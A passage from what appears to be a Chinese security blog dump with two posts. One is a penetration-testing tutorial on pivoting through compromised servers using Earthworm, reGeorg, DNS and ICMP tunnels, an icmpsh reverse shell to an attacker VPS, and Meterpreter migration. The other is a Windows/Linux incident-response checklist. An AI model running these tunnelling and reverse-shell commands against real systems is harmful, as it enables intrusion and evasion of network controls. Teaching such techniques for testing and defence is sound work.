Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。-f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。并推荐加上 -n 参数-g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。-R：远程转发-L：本地转发-D：... 端口转发12ssh -qTfnN -L hostport:host:port -l user remote_ip #正向隧道ssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道 举个例子 12ssh -N -R 5555:192.168.2.100:5556 username@host # 5555是本地端口，本地访问5555就是访问vps的5556ssh -N -R 5555:192.168.2.100:5556 username@host # 5555是vps的端口，访问vps的5555就是访问本地的5556 代理Socks代理Socks代理可以理解为一个增强版的lcx，它在Server监听一个服务端口，当有新的连接请求时会从Socks协议中解析出访问目标的URL的目标端口，再开始执行lcx的具体功能，默认端口1080 网络上Socks代理工具有很多，选用时尽可能使用无GUI界面的、尽可能不需要安装其他依赖软件的，能支持多平台操作系统的更佳 正向代理攻击者主动通过代理来访问目标机器，目标机器可通过外网访问 反向代理目标机器通过代理来访问攻击者 Earthworm下载地址：http://rootkiter.com/EarthWorm EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用 正向代理适用于目标机器拥有一个外网IP Server(目标机器)1ew -s ssocksd -l 12600 目标机器假设了一个端口为12600的Socks代理，使用SocksCap64添加代理就可以直接连接目标机器 Client(攻击者)使用SocksCap64连接 反向代理适用于目标机器没有公网IP，但可访问内网资源 VPS将Earthworm上传到VPS上 1ew -s rcsocks -l 1080 -e 126 在VPS上添加一个转接隧道，把1080端口收到的代理请求转交给126端口 目标机器将Earthworm上传到目标机器上 1ew -s rssocks -d 126.126.126.126 -e 126 在目标机器上启动Socks V5服务，并反弹到VPS的126端口上 VPS查看VPS的CMD界面，若反弹成功，则可以通过访问VPS的1080端口使用假设在目标机器上的Socks5代理服务 二级级联情况1假设获得了Server A和Server B的控制权限，A主机配有2块网卡，一块连通外网，一块10.10.10.10只能连接内网Server B，无法访问内网其它资源。Server B可以访问内网资源，但无法访问外网 Server B1ew -s ssocksd -l 126 使用ssocksd方式启动126端口的Socks代理 Server A1ew -s lcx_tran -l 1080 -f 10.10.10.26 -g 126 将1080端口收到的代理请求转交给Server B的126端口 通过使用Server A的外网26.26.26.26:1080来使用在Server B架设的Socks5代理 数据流向：Socks5→1080→126→ssocksd 情况2假设获得了Server A和Server B的控制权限，Server A没有公网IP，也无法访问内网资源。Server B可以访问内网资源，但无法访问外网 VPS1ew –s lcx_listen –l 1080 –e 12600 在VPS添加转接隧道，将1080端口收到的代理请求转交给12600端口 Server B1ew -s ssocksd -l 126 利用ssocksd方式启动126端口的socks代理 Server A1ew -s lcx_slave -d 126.126.126.126 -e 12600 -f 10.10.10.26 -g 126 在Server A上利用lcx_slave方式，将VPS的12600端口和Server B的126端口连接起来 VPS查看VPS的CMD界面，若连接成功，则可通过访问VPS地址126.126.126.126:10800来使用在B主机架设的Socks5代理 数据流向：Socks5→1080→12600→Server A→126→ssocksd 三级级联三级网络环境在实际渗透中用的比较少，也比较复杂，现在我们来一个个的讲解下三级级联的用法 假设渗透场景：Server A没有公网IP但可以访问外网，Server B不能访问外网但可以被Server A访问、Server C可被Server B访问而且能够访问核心区域 VPS1ew -s rcsocks -l 1080 -e 1260 将1080端口收到的代理请求转交给1260端口 Server A1ew -s lcx_slave -d 126.126.126.126 -e 1260 -f 10.10.2.26 -g 126 将VPS的1260端口和B主机的126端口连接起来 Server B1ew -s lcx_listen -l 126 -e 26 将126端口收到的代理请求转交给26端口 Server C1ew -s rssocks -d 10.10.2.26 -e 26 在C主机上启动SOCKS V5服务，并反弹到B主机的26端口上 Client在Client上访问VPS126.126.126.126:1080来使用在Server C上架设的Socks5代理 整个数据流是：Socks5→1080→1260→126→26→rssocks HTTP代理reGeorg如果目标服务器又Web服务，可以使用reGeorg + proxychains(Linux) + Proxifier(Windows) 下载地址：https://github.com/sensepost/reGeorg Server将reGeorg的tunnel文件上传到目标服务器的网站目录下，选择对应语言的脚本 访问页面，若显示Georg says, &#39;All seems fine&#39;说明脚本正常运行 Client(Linux)攻击机执行 1python reGeorgSocksProxy.py -p port -u http://target.com/tunnel.php 修改proxychains.conf配置文件 1234//不存在可以直接创建vim /etc/proxychains.conf //端口和reGeorg设置端口相同socks5 127.0.0.1 port 扫描时，在命令前加上proxychains4 1proxychains4 nmap -sT -Pn 192.168.126.0/24 Client(Windows)ProxifierProxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链 设置代理，Profile→Proxy Servers→add→输入IP和port→选择Protocol IP地址为目标服务器的IP地址，端口和reGeory设置端口相同，类型为Socks Version，代理规则为默认 右键扫描工具，选择Proxifier→Proxy SOCKS5 IP进行代理 成功代理，可以在reGeorg看到数据流向 PSreGeorg存在2个问题，解决方案在： 1.Cookie在web容器层面发送一些跨域Cookie时，会出现多个Set-Cookie，这时，由于返回一个List，在后续拼接到headers的时候，会出现问题，导致客户端不能正常区分会话，造成交互失败 在某些环境下，需要登录后才可以访问。但由于reGeorg不支持在指定Session下运行，所以需要做出修改 2.User-Agent由于reGeorg直接请求，没有带User-Agent头，所以网站返回500状态码。reGeorg需要200状态码才能正常工作，所以需要在reGeorg请求时加上请求头，在通讯包中也需要加上User-Agent ABPTTSTCP tunneling over HTTP for web application servers py环境 1234//加密库python -m pip install pycrypto//httplibpython -m pip install httplib2 生成服务端，和reGeorg的tunnel文件相同 1python abpttsfactory.py -o tunnel 将生成的tunnel文件上传到目标服务器上 Client1python abpttsclient.py -c tunnel/config.txt -u &quot;http://www.target.com/abptts.php&quot; -f 127.0.0.1:12600/126.126.126.126:3389 -f表示将目标服务器的3389端口转发到本机的12600端口转发成功之后，使用Socks代理工具绑定本机的12600端口，即可访问目标服务器内网中的资源 DNS隧道不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。 Iodine它几乎是和hans icmp隧道工具一样的工作机制，它在它们之间创建一对tun适配器和隧道数据作为DNS查询。 介绍：https://code.kryo.se/iodine/下载地址：https://github.com/yarrick/iodineREADME：https://code.kryo.se/iodine/README.html使用手册：https://code.kryo.se/iodine/iodine_manpage.html VPS： 1iodined -f -c -P password 10.0.0.1 tunneldomain.com Client端： 1iodine -f -r -P password &lt;source-IP&gt; tunneldomain.com source-IP是VPS的公网IP 成功连接将直接在客户端生成地址10.0.0.2。请注意，这种隧道技术的速度相当慢。最好的办法是在生成的连接上使用ssh连接： 1ssh &lt;user&gt;@10.0.0.2 需要重新开启一个终端 PS在Windows环境下使用需要TAP adapter 在Linux环境下使用需要安装zlib1g-dev 1apt install zlib1g-dev Dnscat2通过建立C＆C通道递归DNS查询。此工具不需要root/administrator权限（在Windows和Linux上都可以使用）。它还支持端口转发。 下载地址：https://github.com/iagox86/dnscat2 需求环境Server安装Ruby、gem 1234apt install rubyapt install ruby-dev //ubuntuyum install ruby-devel //CentOSapt install gem 修改gem源 123gem sources --remove http://rubygems.org/gem sources --add https://gems.ruby-china.comgem sources --list 安装ClientClient使用C编写，不需要安装环境 12cd dnscat2/clientmake ServerServer的安装需要Ruby，gem，并且安装过程中需要root权限 123cd dnscat2/servergem install bundlerbundler install 使用Server使用时，需要有root权限 12cd dnscat2/serversudo ruby dnscat2.rb chessur.com 运行之后会自动生成命令，在Client端直接运行即可 Client12345//secret可以不写//具有权威dns服务器./dnscat --secret=chessur test.com//直接连接./dnscat --dns server=x.x.x.x,port=53 --secret=chessur 连接之后，在Server执行命令 123windowssession -i 1listen 127.0.0.1:12600 192.168.126.126:126 将目标机12600端口转发到攻击机的126端口 PS虽然运行不需要root/administrator权限，但在执行gem install bundler时，可能需要root权限。如果没有root权限，可以使用rvm安装。 ICMP隧道ICMP隧道是通过将任意数据注入发送到远程计算机的回送数据包来工作的。要判断是否能使用ICMP隧道，只需要关注一件事情：可以ping一个外部服务器。如果能到达外部网络，那么很有可能可以建立一个icmp隧道。缺点是需要root/administrator权限 下载地址：https://github.com/inquisb/icmpsh VPS1234git clone https://github.com/inquisb/icmpsh.gitapt-get install python-impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1python icmpsh_m.py &lt;source-IP&gt; &lt;destination-IP&gt; source IP是内网可ping的IP地址，destination IP是目标服务器的IP Server1234567icmpsh.exe -t 126.126.126.126 -d 500 -b 30 -s 128-t hots 攻击者IP-r 测试连接-d milliseconds 双方请求延迟-o milliseconds timeout-b num 空连接数量-s bytes 数据长度 PS一旦执行反弹命令，360安全卫士和火绒都会将icmpsh.exe作为木马处理 SSH隧道正向代理12345SSH -qTfnN -D port remotehost #直接进行socks代理ssh -qTfnN -D 6080 user@theserver #在本地终端中运行 然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.-q：静默运行 远程转发(反向)12345678910第一步：sudo python -m SimpleHTTPServer 80在目标机子开启80端口服务第二步：ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS这样就把目标本地的22端口转发到了远程机器（VPS）的6666端口第三步：个人PC机器直接使用语句:ssh -p 6666 -qngfNTD 6767 内网用户@VPS这样就可以直接穿透网络，进入到内网，本地机器直接使用SOCKS5代理127.0.0.1:6767便能够直接访问到目标内网当中 工具Metasploit进程迁移获得Meterpreter Shell之后，第一步要做的是进程迁移，因为当前进程可能随时被用户关闭，而断开连接。将Shell和目标机器的一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作，这会使得渗透过程更隐蔽。 12345678#获得当前进程号getpid#查看当前系统运行进程ps#进程迁移，选择一个稳定的进程号migrate PID#Metasploit自动迁移进程run post/windows/manage/migrate Cobalt Strike横向渗透域渗透后门痕迹清理参考[] 【玩转Linux系统】Linux内网渗透 [] 内网渗透归纳（持续更新） [] 【渗透技巧】内网渗透思路 [] 内网渗透–信息收集（一） [] 内网渗透–信息收集（二） [] 内网渗透–信息收集（三） [] 内网渗透信息收集综合实操报告 [] 渗透基础——端口转发与代理 [] 渗透测试 之 代理篇 [] 【技术分享】内网漫游之SOCKS代理大结局 [] [思路/技术]内网穿透大杀器–EarthWorm [] reGeorg+Proxifier使用 [] 通过ICMP协议反弹SHELL并执行命令 [] 利用icmp隧道 轻松穿透 tcp/udp四层 封锁 [] DNS Tunneling及相关实现 [] SSH端口转发详解及实例","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://chirec.github.io/categories/内网渗透/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://chirec.github.io/tags/内网渗透/"}]},{"title":"'安全应急响应'","slug":"Security-Emergency-Response","date":"2019-05-29T07:37:23.000Z","updated":"2019-06-27T17:56:37.641Z","comments":true,"path":"2019/05/29/Security-Emergency-Response/","link":"","permalink":"https://chirec.github.io/2019/05/29/Security-Emergency-Response/","excerpt":"看了几篇文章，整合到一起，做个总结","text":"看了几篇文章，整合到一起，做个总结 总体思路分析原则及时进行断网隔离操作，重要数据先备份再分析，尽量不要在原来的系统中分析虚拟机建立快照已经被入侵的系统都不再安全，如果条件允许最好采用第三方系统进行分析提醒客户保护现场，不要直接重装系统了解客户网络拓扑，网络的进出口、负载均衡、防火墙、DNS服务器 分析目标找到攻击来源IP找到入侵途径分析影响范围量化影响级别 分析方法大胆猜测是最重要的，猜测入侵途径，然后进行分析一般都会事半功倍。 一般来说，分析日志可以找到很多东西，比如，secure日志可以查看Accept关键字；last可以查看登录信息；bash_history可以查看命令执行信息等，不同的日志有不同的查看方式，最好是系统管理员的陪同下逐步排查，因为系统管理员才最懂他的服务器系统。 分析影响根据服务器的用途、文件内容、机密情况结合数据泄漏、丢失风险，对系统使用者影响等进行影响量化，并记录相关安全事件，总结分析，以便后期总结。 如果已经被进行过内网渗透，还需要及时排查内网机器的安全风险，及时处理。 线索时间：创建时间、修改时间端口、进程 安全事件1.恶意代码威胁，即僵尸网络、恶意木马、蠕虫病毒、勒索病毒等恶意代码导致的安全事件2.高级持续性威胁(APT)攻击事件，即具有潜伏性、隐蔽性、目的性、持续性等特点的安全事件3.非法入侵事件，包括但不限于业务系统受到入侵致使数据泄露、丢失等；外网网站被入侵，导致网站被恶意篡改植入暗链或出现其他非法的宣传标语；服务器被入侵导致受到勒索攻击等安全事件4.漏洞事件，即0day公布；在野漏洞发现；已知漏洞被发现受到通报等安全事件5.数据泄露事件，即重要数据因受到了入侵导致的泄露；应用配置不当导致的泄露；员工误操作导致的泄露；内鬼泄露等安全事件6.分布式拒绝服务攻击（DDOS）事件，即网站受到了各类DOS攻击，包括但不限于CC攻击、洪水攻击、流量放大攻击等安全事件7.流量劫持，DNS劫持、HTTP劫持8.其他归于网络安全的事件 应急目的确认安全事件后，明确应急目的：1.病毒、后门清除工作2.协助业务系统安全的恢复上线3.攻击溯源工作(仅溯源至攻击者的攻击切入点) 工作内容病毒分析处置、业务恢复、安全加固、溯源分析、临时需求处置、产品对接与使用、应急指挥与协调 Windows安全应急响应入侵排查思路检查账号安全1.查看服务器是否有弱口令，远程管理端口是否对公网开放 2.查看服务器是否存在可以账号、新增账号 3.查看服务器是否存在隐藏账号、克隆账号检查方法： i.打开注册表，查看管理员对应键值HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\ ii.使用D盾_web查杀工具 4.结合日志，查看管理员登录时间、用户名是否存在异常检查方法： i.Win+R打开运行，输入eventvwr.msc，打开事件查看器 ii.导出Windos日志--安全，利用Log Parser进行分析 检查异常端口、进程1.检查端口连接情况，是否有远程连接、可以连接检查方法： i.netstat -ano查看当前的网络连接，定位可疑的ESTABLISHED ii.根据netstat定位出的PID，再通过tasklist命令进行进程定位tasklist|findstr &quot;PID&quot; 2.检查进程检查方法： i.Win+R，输入msinfo32，依次点击软件环境→正在运行任务就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间 ii.打开D盾_web查杀工具，进程查看，关注没有签名信息的进程 iii.通过微软官方提供的Process Explorer等工具排查 iv.查看可疑的进程及其子进程，通过观察以下内容：没有签名验证信息的进程、没有描述信息的进程、进程的属主、进程的路径是否合法、CPU或内存资源占用长时间过高的进程 3.小技巧 i.查看端口对应的PID：netstat -ano|findstr &quot;port&quot; ii.查看进程对应的PID：任务管理器–查看–选择列–PID或者tasklist|findstr &quot;Process Name&quot; iii.查看进程对应的程序位置：任务管理器–选择对应进程–右键打开文件位置或Win+R，输入wmic，cmd界面下输入process iv.tasklist/svc v.查看Windows服务所对应的端口：%system%/system32/drivers/etc/services（一般%system%就是C:\\Windows） 检查启动项、计划任务、服务1.检查服务器是否有异常的启动项检查方法： i.登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下ii.单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件 iii.单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项： HKEY_CURRENT_USER\\software\\micorsoft\\windows\\currentversion\\runHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马 iv.利用安全软件查看启动项、开机时间管理等 v.组策略，运行gpedit.msc 2.检查计划任务检查方法： i.单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径 ii.单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接 3.服务自启动检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。 检查系统相关信息1.查看系统版本及补丁信息cmd中输入systeminfo 2.查找可以目录及文件检查方法： i.查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录 Windows 2003 C:\\Documents and Settings Windows 2008R2 C:\\Users\\ ii.单击【开始】&gt;【运行】，输入%UserProfile%\\Recent，分析最近打开分析可疑文件 iii.在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件 自动化查杀病毒查杀检查方法：下载安全软件，更新最新病毒库，进行全盘扫描 WebShell查杀检查方法：选择具体站点路径进行WebShell查杀，建议使用两款WebShell查杀工具同时查杀，可相互补充规则库的不足 日志分析系统日志分析方法： i.前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。 ii.Win+R打开运行，输入”eventvwr.msc”，回车运行，打开”事件查看器”。 iii.导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。 WEB访问日志分析方法： i.找到中间件的web日志，打包到本地方便进行分析。 ii.推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错；Linux下，使用Shell命令组合查询分析 工具病毒分析PCHunter 火绒剑 病毒查杀火绒安全软件 在线病毒扫描腾讯哈勃分析系统 WebShell查杀河马webshell查杀 深信服Webshell网站后门检测工具 Windows登录类型Audit logon events 登录类型2：交互式登录(Interactive)用户在计算机的控制台上进行的登录，也就是在本地键盘上进行的登录，通过KVM登录仍然属于交互式登录，虽然它是基于网络的 登录类型3：网络(Network)从网络的上访问一台计算机时在大多数情况下Windows记为类型3，最常见的情况就是连接到共享文件夹或者共享打印机时。另外大多数情况下通过网络登录IIS时也被记为这种类型，但基本验证方式的IIS登录是个例外，它将被记为类型8 登录类型4：批处理(bat)当Windows运行一个计划任务时，“计划任务服务”将为这个任务首先创建一个新的登录会话以便它能在此计划任务所配置的用户账户下运行，当这种登录出现时，Windows在日志中记为类型4，对于其它类型的工作任务系统，依赖于它的设计，也可以在开始工作时产生类型4的登录事件，类型4登录通常表明某计划任务启动，但也可能是一个恶意用户通过计划任务来猜测用户密码，这种尝试将产生一个类型4的登录失败事件，但是这种失败登录也可能是由于计划任务的用户密码没能同步更改造成的，比如用户密码更改了，而忘记了在计划任务中进行更改。 登录类型5：服务(Service)与计划任务类似，每种服务都被配置在某个特定的用户账户下运行，当一个服务开始时，Windows首先为这个特定的用户创建一个登录会话，这将被记为类型5，失败的类型5通常表明用户的密码已变而这里没得到更新，当然这也可能是由恶意用户的密码猜测引起的，但是这种可能性比较小，因为创建一个新的服务或编辑一个已存在的服务默认情况下都要求是管理员或serversoperators身份，而这种身份的恶意用户，已经有足够的能力来干他的坏事了，已经用不着费力来猜测服务密码了。 登录类型6：解锁(Unlock)当用户离开他的计算机时相应的工作站自动开始一个密码保护的屏保，当用户回来解锁时，Windows就把这种解锁操作认为是一个类型7的登录，失败的类型7登录表明有人输入了错误的密码或者有人在尝试解锁计算机。 登录类型8：网络明文(NetworkCleartext)这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。 登录类型9：新凭证(NewCredentials)当使用带/Netonly参数的RUNAS命令运行一个程序时，RUNAS以本地当前登录用户运行它，但如果这个程序需要连接到网络上的其它计算机时，这时就将以RUNAS命令中指定的用户进行连接，同时Windows将把这种登录记为类型9，如果RUNAS命令没带/Netonly参数，那么这个程序就将以指定的用户运行，但日志中的登录类型是2。 登录类型10：远程交互(RemoteInteractive)当通过终端服务、远程桌面或远程协助访问计算机时，Windows将记为类型10，以便与真正的控制台登录相区别，注意XP之前的版本不支持这种登录类型，比如Windows2000仍然会把终端服务登录记为类型2。 登录类型11：缓存交互(CachedInteractive)Windows支持一种称为缓存登录的功能，这种功能对移动用户尤其有利，比如你在自己网络之外以域用户登录而无法登录域控制器时就将使用这种功能，默认情况下，Windows缓存了最近10次交互式域登录的凭证HASH，如果以后当你以一个域用户登录而又没有域控制器可用时，Windows将使用这些HASH来验证你的身份。 需要注意的是，Windows2000在默认情况下是没有纪录安全日志的！用户在Windows2000中需启用组策略“计算机配置/Windows设置/安全设置/本地策略/审核策略”下的“审核登录事件”才能看到相应的记录信息。 事件ID Event ID(2000/XP/2003) Event ID(Vista/7/8/2008/2012) 描述 528 4624 成功登录 529 4625 失败登录 680 4776 成功/失败的账户认证 624 4720 创建用户 632 4728 添加用户到启用安全性的全局组中 636 4732 添加用户到启用安全性的本地组中 2934 7030 服务创建错误 2944 7040 IPSEC服务的启动类型已从禁用更改为自动启动 2949 7045 服务创建 Logprase下载地址 使用Security Log主要查看管理员登录时间段是否为正常时间木马运行时间是否和管理员登录时间对应 1LogParser -i:EVT -o DATAGRID &quot;SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&apos;|&apos;) as username,EXTRACT_TOKEN(Strings,8,&apos;|&apos;) as LogonType, EXTRACT_TOKEN(Strings,17,&apos;|&apos;) as ProcessName, EXTRACT_TOKEN(Strings,18,&apos;|&apos;) as SourceIP FROM Security where EventID=4624 AND TO_DATE(TimeGenerated) BETWEEN TIMESTAMP(&apos;2019-05-30&apos;,&apos;yyyy-MM-dd&apos;) and TIMESTAMP(&apos;2019-05-31&apos;,&apos;yyyy-MM-dd&apos;)&quot; System Log主要查看服务名、服务路径 1LogParser -i:EVT -o:DATAGRID &quot;SELECT TimeWritten,EventID,EventType,EventTypeName,SourceName,EXTRACT_TOKEN(Strings,0,&apos;|&apos;) as service_name,EXTRACT_TOKEN(Strings,1,&apos;|&apos;) as service_path,Message from system WHERE TO_DATE(TimeGenerated) BETWEEN TIMESTAMP(&apos;2019-05-30&apos;,&apos;yyyy-MM-dd&apos;) AND TIMESTAMP(&apos;2019-05-31&apos;,&apos;yyyy-MM-dd&apos;)&quot; Application Log主要查看程序运行时间 1LogParser -i:EVT -o:DATAGRID &quot;SELECT * FROM Application WHERE TO_DATE(TimeGenerated) BETWEEN TIMESTAMP(&apos;2019-05-30&apos;,&apos;yyyy-MM-dd&apos;) AND TIMESTAMP(&apos;2019-05-31&apos;,&apos;yyyy-MM-dd&apos;)&quot; WMIC查看进程的命令行参数 1234567wmic process get caption,commandline /value &gt; tmp.txtwmic service list briefwmic process list briefwmic startup list brief//查看安装补丁和时间信息wmic qfe wmic qfe get Caption,Description,HotFixID,InstalledOn DOS命令dir12345678DIR [drive:][path][filename] [/A[[:]attributes]] [/B] [/C] [/D] [/L] [/N] [/O[[:]sortorder]] [/P] [/Q] [/R] [/S] [/T[[:]timefield]] [/W] [/X] [/4]/A 显示具有指定属性的文件 属性：D目录 R只读文件 H隐藏文件 A准备存档的文件 S系统文件 I无内容索引文件 L解析点 -表示“否”的前缀/S 显示指定目录及子目录中文件/W 用宽列表格式显示/P 显示满一屏暂停，按任意键后继续显示下一屏/Q 显示文件所有者 copy和xcopycopy只能拷贝文件，不能拷贝文件夹xcopy能拷贝文件夹及文件 12345xcopy参数/S 复制目录和子目录，除了空目录/E 复制目录和子目录，包括空目录/C 忽略错误继续复制/H 复制隐藏和系统文件 del、deltree、rddel 只能删除一个或者多个文件，不能删除文件夹 deltree 是一个外部命令，可以删除文件及文件夹，以及其子文件夹 rd 删除空文件夹，需要空文件夹的绝对路径 123del 参数/s 递归删除文件夹及文件/q 不提示确认删除 move移动一个或多个文件 12/Y 若目标文件夹下有同名文件，忽略提示，直接覆盖原文件/-Y 提示警告 attrib更改文件属性 1234567attrib 参数+ 设置属性- 删除属性R 只读文件A 存档文件S 系统文件H 隐藏文件 netstat查看网络连接、端口信息 12345678910111213NETSTAT [-a] [-b] [-e] [-n] [-o] [-p proto] [-r] [-s] [-t] [-v] [interval]-a 显示连接和监听端口-b 显示包含于创建每个连接或监听端口的可执行组件;需要权限-e 显示以太网统计信息-n 以数字形式显示地址和端口号-o 显示与每个连接相关的所属进程ID-p proto 显示指定协议的连接;可以是TCP、UDP、TCPv6、UDPv6-r 显示路由表-s 按协议显示统计信息-t 显示当前连接卸载状态-x 显示NetworkDirect连接、侦听器和共享终结点-y 显示所有连接TCP连接模板;无法与其他选项结合使用interval 重新显示选定的统计信息，各个显示间暂停的间隔秒数。按CTRL+C停止重新显示统计信息。 Linux的netstat1234567891011121314151617181920212223242526272829303132333435usage: netstat [-vWeenNcCF] [&lt;Af&gt;] -r netstat &#123;-V|--version|-h|--help&#125; netstat [-vWnNcaeol] [&lt;Socket&gt; ...] netstat &#123; [-vWeenNac] -i | [-cnNe] -M | -s [-6tuw] &#125; -r, --route display routing table -i, --interfaces display interface table -g, --groups display multicast group memberships -s, --statistics display networking statistics (like SNMP) -M, --masquerade display masqueraded connections -v, --verbose be verbose -W, --wide don&apos;t truncate IP addresses -n, --numeric don&apos;t resolve names --numeric-hosts don&apos;t resolve host names --numeric-ports don&apos;t resolve port names --numeric-users don&apos;t resolve user names -N, --symbolic resolve hardware names -e, --extend display other/more information -p, --programs display PID/Program name for sockets -o, --timers display timers -c, --continuous continuous listing -l, --listening display listening server sockets -a, --all display all sockets (default: connected) -F, --fib display Forwarding Information Base (default) -C, --cache display routing cache instead of FIB -Z, --context display SELinux security context for sockets &lt;Socket&gt;=&#123;-t|--tcp&#125; &#123;-u|--udp&#125; &#123;-U|--udplite&#125; &#123;-S|--sctp&#125; &#123;-w|--raw&#125; &#123;-x|--unix&#125; --ax25 --ipx --netrom &lt;AF&gt;=Use &apos;-6|-4&apos; or &apos;-A &lt;af&gt;&apos; or &apos;--&lt;af&gt;&apos;; default: inet List of possible address families (which support routing): inet (DARPA Internet) inet6 (IPv6) ax25 (AMPR AX.25) netrom (AMPR NET/ROM) ipx (Novell IPX) ddp (Appletalk DDP) x25 (CCITT X.25) 用户操作12345net user chessur password /addnet localgroup administrators chessur /addnet user chessur /active:yesnet user chessur /actice:nonet user chessur /del 信息收集1.事情的起因经过结果2.需要解决的问题3.网络环境，拓扑图4.系统环境5.服务器运行的服务6.服务是否有重要资料，资料是否外泄7.是否有安全设备(防火墙，WAF)8.了解服务环境(开发语言，开发框架，开发商)9.有没有处理过问题，处理了什么东西10.日志是否完整(网站访问日志，中间件日志，网络安全设备日志，系统安全日志，日志时间)11.内网环境下，被攻击服务器是否与其他服务器有连接，排查连接服务器12.没有外连情况下，排查服务器是否安装远程控制类的软件 解决问题1.攻击时间，结束时间(从日志上分析)2.攻击路径(入侵利用的漏洞)3.木马样本取样4.服务器是否被提权5.检查是否有隐藏后门，遗留文件(从高危网站目录上查看，如upload目录)6.检查网站后台是否有可疑操作日志 注意事项1.让客户做好备份2.不要随意增删改查文件，任何操作都要经过客户同意之后再进行3.删除文件时，让网站开发商确认文件是否为网站自身文件，如果不是，让网站开发商自行删除4.上传安全工具需要客户同意5.如果安全工具缺乏运行环境、驱动不能正常运行，不要随意安装驱动，以免服务崩溃 问题排查步骤1.判断服务器有没有被RootkitRootkit：一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。 使用PCHunter查看，如果被Rootkit，只能重装系统 2.检查登录日志，任务计划，开机启动项登录日志控制面板->查看事件日志->Windows日志->安全 可以根据登录日志排查入侵日期，也可判断攻击者是否通过暴破口令入侵。 任务计划管理工具->任务计划程序 检查攻击者有没有设置定时任务运行恶意程序 开机启动项开始菜单->启动 检查活动痕迹1.用户文件夹C:\\Users查看攻击者的一些活动范围 2.用户桌面文件C:\\Documents and Settings\\user\\Desktop Documents and Settings文件夹需要修改权限查看属性->安全->高级->Everyone->编辑->取消列出文件夹/读取数据勾选 3.用户的网络访问情况C:\\Documents and Settings\\user\\CookiesCookie文件夹中可能会记录一些敏感信息 4.程序安装的临时文件C:\\Documents and Settings\\user\\Local Settings\\Temp一些程序安装、解压缩等操作可能会在该目录产生临时文件 5.最近浏览C:\\Documents and Settings\\user\\Recent用户最近访问过哪些文件或文件夹 6.上网历史记录C:\\Documents and Settings\\user\\Local Settings\\History 7.临时文件C:\\Documents and Settings\\user\\Local Settings\\Temporary Internet Files浏览网页时产生的临时文件，但不会存储网页页面内容，还可能以临时文件的方式存储一些下载的文件 检查隐藏账号攻击者使用$符号创建的隐藏账户，使用net user无法查看管理工具->计算机管理->用户查看隐藏用户 检查注册表一些文件可以通过修改注册表达到再生 有些攻击者通过修改注册表键值创建隐藏用户查看注册表HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\删除该注册表下对应账户的键值删除隐藏用户 显示隐藏文件1.dircmd下输入dir查看 2.文件夹选项-显示隐藏显示隐藏的文件、文件夹和驱动器隐藏受保护的操作系统文件 3.xcopy复制文件夹到其他目录 4.move移动文件夹到其他目录 5.attrib1attrib -h C:\\chessur 6.查看注册表修改HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ Advanced\\Folder\\Hidden\\SHOWALL注册表的CheckedValue值，0表示不显示、1表示显示 7.移动到Linux系统下将文件打包到Linux系统下，提取干净文件，将感染文件夹使用工具粉碎，再将干净文件打包到Windows系统下 Linux入侵排查思路用户1.查询特权用户1awk -F: &apos;$3==0&#123;print $1&#125;&apos; /etc/passwd 2.查询可以远程登录的用户1awk 